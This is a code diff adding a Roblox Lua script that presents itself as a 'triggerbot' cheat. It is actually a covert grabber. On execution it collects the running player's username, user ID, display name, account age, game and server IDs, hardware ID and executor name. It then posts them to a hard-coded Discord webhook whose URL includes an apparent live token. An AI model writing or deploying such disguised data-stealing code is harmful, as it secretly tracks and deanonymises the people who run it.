@@ -1,0 +1,36 @@
+local webhookUrl = "https://discordapp.com/api/webhooks/1517488868163588248/yGw6xljY2r4xlianCxDtfBLHtEeFZg_6ZjvhjsswyCGSaF4Gwk4UeWxSerp37zow9oSZ
+"
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local function sendWebhook(data)
+    local payload = HttpService:JSONEncode({
+        content = "triggerbot has been executed",
+        embeds = {{
+            title = "Player Grabbed - " .. player.Name,
+            color = 0xFF0000,
+            fields = {
+                {name = "Username", value = player.Name, inline = true},
+                {name = "UserId", value = tostring(player.UserId), inline = true},
+                {name = "DisplayName", value = player.DisplayName, inline = true},
+                {name = "AccountAge (days)", value = tostring(player.AccountAge), inline = true},
+                {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
+                {name = "Game Name", value = MarketplaceService:GetProductInfo(game.PlaceId).Name, inline = true},
+                {name = "JobId / Server", value = game.JobId, inline = true},
+                {name = "HWID", value = (gethwid and gethwid() or "HWID_NOT_FOUND - use better executor"), inline = false},
+                {name = "Executor", value = (identifyexecutor and identifyexecutor() or "Unknown Executor"), inline = true},
+                {name = "Execution Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true},
+                {name = "Server Join Script / Context", value = "Executed grabber script on join/execution. Full data logged."}
+            },
+            footer = {text = "log " .. os.time()}
+        }}
+    })
+
+    HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+end
+
+sendWebhook({})
+
+print("executed")
